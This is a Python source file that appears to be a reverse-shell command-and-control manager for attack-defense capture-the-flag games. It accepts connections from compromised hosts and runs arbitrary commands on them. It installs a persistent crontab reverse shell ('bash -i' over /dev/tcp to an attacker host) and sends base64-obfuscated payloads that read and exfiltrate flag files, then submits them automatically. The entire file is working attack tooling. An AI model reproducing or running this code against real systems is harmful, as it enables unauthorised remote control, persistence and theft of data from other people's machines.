#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import threading
import time
import hashlib
import random
import string
import sys
import os
import signal
import requests
import sys

from rshm.utils.log import Log

slaves = {}
masters = {}


flag_path = "/flag"
EXIT_FLAG = False
MAX_CONNECTION_NUMBER = 0x10

def submit_flag(flag):
    try:
        # TODO
        url = "http://127.0.0.1:5000/?flag=%s" % (flag)
        print((requests.get(url).content))
    except Exception as e:
        print(e)

def md5(data):
    if type(data) == str:
        data = data.encode()
    return hashlib.md5(data).hexdigest()


def recvuntil(p, target):
    data = ""
    while target not in data:
        data += p.recv(1)
    return data


def recvall(socket_fd):
    data = ""
    size = 0x100
    while True:
        r = socket_fd.recv(size)
        if not r:
            break
        data += r
        if len(r) < size:
            break
    return data


def slaver(host, port, fake):
    slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    slaver_fd.connect((host, port))
    banner = "[FakeTerminal] >> "
    while True:
        if EXIT_FLAG:
            Log.warning("Slaver function exiting...")
            break
        command = recvuntil(slaver_fd, "\n")
        if fake:
            slaver_fd.send(banner)
        # Log.info("Executing : %r" % (command))
        try:
            result = os.popen(command).read()
        except:
            result = ""
        slaver_fd.send(command + result)
    Log.warning("Closing connection...")
    slaver_fd.shutdown(socket.SHUT_RDWR)
    slaver_fd.close()


def transfer(h):
    slave = slaves[h]
    socket_fd = slave.socket_fd
    buffer_size = 0x400
    interactive_stat = True
    while True:
        if EXIT_FLAG:
            Log.warning("Transfer function exiting...")
            break
        interactive_stat = slave.interactive
        buffer = socket_fd.recv(buffer_size)
        if not buffer:
            Log.error("No data, breaking...")
            break
        sys.stdout.write(buffer)
        if not interactive_stat:
            break
    if interactive_stat:
        Log.error("Unexpected EOF!")
        socket_fd.shutdown(socket.SHUT_RDWR)
        socket_fd.close()
        slave.remove_node()

def random_string(length, chars):
    return "".join([random.choice(chars) for i in range(length)])


class Slave():
    def __init__(self, socket_fd):
        self.socket_fd = socket_fd
        self.hostname, self.port = socket_fd.getpeername()
        self.node_hash = node_hash(self.hostname, self.port)
        self.interactive = False
        self.api_info = self.location(self.hostname)
        self.country = self.api_info['country']
        self.isp = self.api_info['isp']
        self.area = self.api_info['area']
        self.region = self.api_info['region']
        self.city = self.api_info['city']

    def location(self, host):
        '''
        try:
            response = requests.get("http://ip.taobao.com/service/getIpInfo.php?ip=%s" % (host), timeout=0.5)
            content = response.content
            return json.loads(content)["data"]
        except Exception as e:
            Log.error(str(e))
        '''
        return {"data":"error", 'country': 'Unknown_country','isp': 'Unknown_isp','area': 'Unknown_area','region': 'Unknown_region','city': 'Unknown_city',}

    def show_info(self):
        Log.info("Hash : %s" % (self.node_hash))
        Log.info("From : %s:%d" % (self.hostname, self.port))
        Log.info("ISP : %s-%s" % (self.country, self.isp))
        Log.info("Location : %s-%s-%s" % (self.area, self.region, self.city))

    def send_command(self, command):
        try:
            self.socket_fd.send(command + "\n")
            return True
        except:
            self.remove_node()
            return False

    def system_token(self, command):
        token = random_string(0x10,string.letters)
        payload = "echo '%s' && %s ; echo '%s'\n" % (token, command, token)
        Log.info(payload)
        self.send_command(payload)
        time.sleep(0.2)
        result = recvall(self.socket_fd)
        print(("%r") % (result))
        if len(result.split(token)) == 3:
            return result.split(token)[1]
        else:
            return "Somthing wrong"


    def send_command_log(self, command):
        log_file = "./log/%s.log" % (time.strftime("%Y-%m-%d_%H:%M:%S", time.localtime()))
        Log.info("Log file : %s" % (log_file))
        self.send_command(command)
        time.sleep(0.5)
        Log.info("Receving data from socket...")
        result = recvall(self.socket_fd)
        Log.success(result)
        with open(log_file, "a+") as f:
            f.write("[%s]\n" % ("-" * 0x20))
            f.write("From : %s:%d\n" % (self.hostname, self.port))
            f.write("ISP : %s-%s\n" % (self.country, self.isp))
            f.write("Location : %s-%s-%s\n" % (self.area, self.region, self.city))
            f.write("Command : %s\n" % (command))
            f.write("%s\n" % (result))

    def send_command_print(self, command):
        print((">>>>>> %s") % command)
        self.send_command(command)
        time.sleep(0.5)
        Log.info("Receving data from socket...")
        result = recvall(self.socket_fd)
        Log.success(result)

    def interactive_shell(self):
        self.interactive = True
        t = threading.Thread(target=transfer, args=(self.node_hash, ))
        t.start()
        try:
            while True:
                command = input()
                if command == "exit":
                    self.interactive = False
                    self.socket_fd.send("\n")
                    break
                self.socket_fd.send(command + "\n")
        except:
            self.remove_node()
        self.interactive = False
        time.sleep(0.125)

    def save_crontab(self, target_file):
        command = "crontab -l > %s" % (target_file)
        self.send_command_print(command)

    def add_crontab(self, content):
        # 1. Save old crontab
        Log.info("Saving old crontab")
        chars = string.letters + string.digits
        target_file = "/tmp/%s-system.server-%s" % (random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 3. Add a new task
        content = content + "\n"
        Log.info("Add new tasks : %s" % (content))
        command = 'echo "%s" | base64 -d >> %s' % (content.encode("base64").replace("\n", ""), target_file)
        self.send_command(command)
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...")
        command = 'crontab %s' % (target_file)
        self.send_command(command)
        # 5. Delete temp file
        Log.info("Deleting temp file...")
        command = "rm -rf %s" % (target_file)
        self.send_command(command)
        # 6. Receving buffer data
        print(recvall(self.socket_fd))

    def del_crontab(self, pattern):
        # 1. Save old crontab
        Log.info("Saving old crontab")
        chars = string.letters + string.digits
        target_file = "/tmp/%s-system.server-%s" % (random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 2. Delete old reverse shell tasks
        Log.info("Removing old tasks in crontab...")
        command = 'sed -i "/bash/d" %s' % (target_file)
        self.send_command(command)
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...")
        command = 'crontab %s' % (target_file)
        self.send_command(command)
        # 5. Delete temp file
        Log.info("Deleting temp file...")
        command = "rm -rf %s" % (target_file)
        self.send_command(command)
        # 6. Receving buffer data
        print(recvall(self.socket_fd))

    def auto_connect(self, target_host, target_port):
        # self.del_crontab("bash")
        content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (target_host, target_port)
        # self.add_crontab(content)
        self.system_token("crontab -r;echo '%s'|base64 -d|crontab" % (content.encode("base64").replace("\n", "")))

    def remove_node(self):
        Log.error("Removing Node!")
        if self.node_hash in list(slaves.keys()):
            slaves.pop(self.node_hash)


def master(host, port):
    Log.info("Master starting at %s:%d" % (host, port))
    master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master_fd.bind((host, port))
    master_fd.listen(MAX_CONNECTION_NUMBER)
    while(True):
        if EXIT_FLAG:
            break
        slave_fd, slave_addr = master_fd.accept()
        Log.success("\r[+] Slave online : %s:%d" % (slave_addr[0], slave_addr[1]))
        repeat = False
        for i in list(slaves.keys()):
            slave = slaves[i]
            if slave.hostname == slave_addr[0]:
                repeat = True
                break
        if repeat:
            Log.warning("Detect the same host connection, reseting...")
            slave_fd.shutdown(socket.SHUT_RDWR)
            slave_fd.close()
        else:
            slave = Slave(slave_fd)
            slaves[slave.node_hash] = slave
    Log.error("Master exiting...")
    master_fd.shutdown(socket.SHUT_RDWR)
    master_fd.close()


def show_commands():
    print ("Commands : ")
    print ("        0. [h|help|?|\\n] : show this help")
    print ("        1. [l] : list all online slaves")
    print ("        2. [p] : log.info(position info")
    print ("        3. [i] : interactive shell")
    print ("        4. [g] : goto a slave")
    print ("        5. [gf] : get flag")
    print ("        6. [gaf] : get all flag")
    print ("        7. [c] : command for all")
    print ("        8. [cronadd] : add crontab")
    print ("        9. [crondel] : del crontab")
    print ("        10. [cl] : command to log")
    print ("        11. [setl] : set local execute")
    print ("        12. [setr] : set remote execute")
    print ("        13. [d] : delete node")
    print ("        14. [ac] : auto connection")
    print ("        15. [aac] : all node auto connction")
    print ("        16. [nm] : listen another port")
    print ("        17. [q|quit|exit] : exit")

def signal_handler(ignum, frame):
    print("")
    show_commands()

def node_hash(host, port):
    return md5("%s:%d" % (host, port))

def decode_flag(flag):
    result = ""
    key = 233
    for i in flag:
        result += chr(ord(i) ^ key)
    return result

def main():
    if len(sys.argv) != 3:
        print ("Usage : ")
        print ("\tpython master.py [HOST] [PORT]")
        exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    EXEC_LOCAL = True

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    master_thread = threading.Thread(target=master, args=(host, port,))
    slaver_thread = threading.Thread(target=slaver, args=(host, port, True,))
    master_thread.daemon = True
    slaver_thread.daemon = True
    Log.info("Starting server...")
    master_thread.start()
    Log.info("Connecting to localhost server...")
    slaver_thread.start()
    time.sleep(0.75)
    show_commands()
    position = slaves[list(slaves.keys())[0]].node_hash  # master himself
    while True:
        if len(list(slaves.keys())) == 0:
            Log.error("No slaves left , exiting...")
            break
        if not position in list(slaves.keys()):
            Log.error("Node is offline... Changing node...")
            position = list(slaves.keys())[0]
        current_slave = slaves[position]
        context_hint = "[%s:%d]" % (current_slave.hostname, current_slave.port)
        Log.context(context_hint)
        command = input(" >> ") or "h"
        if command.startswith("#"):
            continue
        if command == "h" or command == "help" or command == "?" or command == "\n":
            show_commands()
        elif command == "l":
            Log.info("Listing online slaves...")
            for key in list(slaves.keys()):
                print(("[%s]") % ("-" * 0x2A))
                slaves[key].show_info()
            print(("[%s]") % ("-" * 0x2A))
        elif command == "p":
            current_slave.show_info()
        elif command == "c":
            cmd = input("Input command (uname -r) : ") or ("uname -r")
            Log.info("Command : %s" % (cmd))
            for i in list(slaves.keys()):
                slave = slaves[i]
                result = slave.send_command_print(cmd)
        elif command == "cl":
            cmd = input("Input command (uname -r) : ") or ("uname -r")
            Log.info("Command : %s" % (cmd))
            for i in list(slaves.keys()):
                slave = slaves[i]
                result = slave.send_command_log(cmd)
        elif command == "cronadd":
            content = input("Input new crontab task (* * * * * date): ") or ("* * * * * date")
            current_slave.add_crontab(content)
        elif command == "crondel":
            pattern = input("Input pattern (bash) : ") or ("bash")
            current_slave.del_crontab(pattern)
        elif command == "g":
            input_node_hash = input(
                "Please input target node hash : ") or position
            Log.info("Input node hash : %s" % (repr(input_node_hash)))
            if input_node_hash == position:
                Log.warning("Position will not change!")
                continue
            found = False
            for key in list(slaves.keys()):
                if key.startswith(input_node_hash):
                    # old_slave = slaves[position]
                    new_slave = slaves[key]
                    # Log.info("Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port))
                    Log.info("Changing position to [%s:%d]" % (new_slave.hostname, new_slave.port))
                    position = key
                    found = True
                    break
            if not found:
                Log.error("Please check your input node hash!")
                Log.error("Position is not changed!")
        elif command == "setl":
            EXEC_LOCAL = True
        elif command == "setr":
            EXEC_LOCAL = False
        elif command == "gaf":
            while True:
                '''
                flag_path = raw_input(
                    "Input flag path (/flag.txt) : ") or ("/flag.txt")
                box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                    "192.168.187.128")
                box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
                '''
                for i in list(slaves.keys()):
                    slave = slaves[i]
                    r_info = open("host").read()
                    r_host = r_info.split(":")[0]
                    r_port = int(r_info.split(":")[1])
                    slave.auto_connect(r_host, r_port)
                    payload = "python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
flag = open("__FLAG_PATH__").read()
key = 233
result = ""
for i in flag:
    result += chr(ord(i) ^ key)
print result
                    '''.replace("__FLAG_PATH__", flag_path).encode("base64").replace("\n", "")
                    # cmd = "FLAG=`%s`" % (payload)
                    # Log.info(cmd)
                    # exit(0)
                    Log.info("Command : %s" % (payload))
                    result = slave.system_token(payload)
                    flag = decode_flag(result.replace("\n", "").replace("\r","")).replace("\n", "").replace("\r", "")
                    Log.info("FLAG: %s" % flag)
                    submit_flag(flag)
                    Log.info("Submitted")
                    '''
                    cmd = "FLAG=`cat %s | base64`" % (flag_path)
                    Log.info("Command : %s" % (cmd))
                    result = slave.send_command(cmd)
                    cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
                        box_host, box_port)
                    Log.info("Command : %s" % (cmd))
                    result = slave.send_command(cmd)
                    if result:
                        Log.info("Flag is sent to you!")
                    else:
                        # slave.remove_node()
                        Log.error("Executing command failed! Connection aborted! Node removed!")
                        position = slaves.keys()[0]
                        Log.info("Position changed to : %s" % (position))
                        '''
                sleep_time = int(open("sleep").read())
                if sleep_time == 0:
                    break
                time.sleep(sleep_time)
        elif command == "gf":
            # flag_path = raw_input(
                # "Input flag path (/flag) : ") or ("/flag")
            # box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                # "192.168.187.128")
            # box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
            payload = "python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
flag = open("__FLAG_PATH__").read()
key = 233
result = ""
for i in flag:
    result += chr(ord(i) ^ key)
print result
            '''.replace("__FLAG_PATH__", flag_path).encode("base64").replace("\n", "")
            # cmd = "FLAG=`%s`" % (payload)
            # Log.info(cmd)
            # exit(0)
            Log.info("Command : %s" % (payload))
            result = current_slave.system_token(payload)
            flag = decode_flag(result)
            Log.info("FLAG: %s" % flag)
            submit_flag(flag)
            Log.info("Submitted")
            # cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
            #     box_host, box_port)
            # Log.info("Command : %s" % (cmd))
            # result = current_slave.send_command(cmd)
            # if result:
                # Log.info("Flag is sent to you!")
            # else:
             #   # slave.remove_node()
             ##   Log.error("Executing command failed! Connection aborted! Node removed!")
             #   position = slaves.keys()[0]
             #   Log.info("Position changed to : %s" % (position))
        elif command == "i":
            current_slave.interactive_shell()
        elif command == "d":
            current_slave.remove_node()
        elif command == "ac":
            target_host = input("Target host (192.168.1.1) : ") or ("192.168.1.1")
            target_port = int(input("Target port (8080) : ") or ("8080"))
            Log.info("Changing crontab...")
            current_slave.auto_connect(target_host, target_port)
        elif command == "aac":
            target_host = input("Target host (192.168.1.1) : ") or ("192.168.1.1")
            target_port = int(input("Target port (8080) : ") or ("8080"))
            for i in list(slaves.keys()):
                slave = slaves[i]
                slave.auto_connect(target_host, target_port)
        elif command == "nm":
            new_master_host = input("Input new master's host (0.0.0.0): ") or ("0.0.0.0")
            new_master_port = int(input("Input new master's port (8090): ") or ("8090"))
            new_master_thread = threading.Thread(target=master, args=(new_master_host, new_master_port,))
            new_master_thread.daemon = True
            new_master_thread.start()
            # TODO : OO
            # TODO : Master Management
        elif command == "q" or command == "quit" or command == "exit":
            EXIT_FLAG = True
            # TODO : release all resources before closing
            Log.info("Releasing resources...")
            for key in list(slaves.keys()):
                slave = slaves[key]
                Log.error("Closing conntion of %s:%d" % (slave.hostname, slave.port))
                slave.socket_fd.shutdown(socket.SHUT_RDWR)
                slave.socket_fd.close()
            Log.error("Exiting...")
            exit(0)
        else:
            Log.error("Unsupported command!")
            if EXEC_LOCAL:
                os.system(command)
            else:
                current_slave.send_command_print(command)


if __name__ == "__main__":
    main()
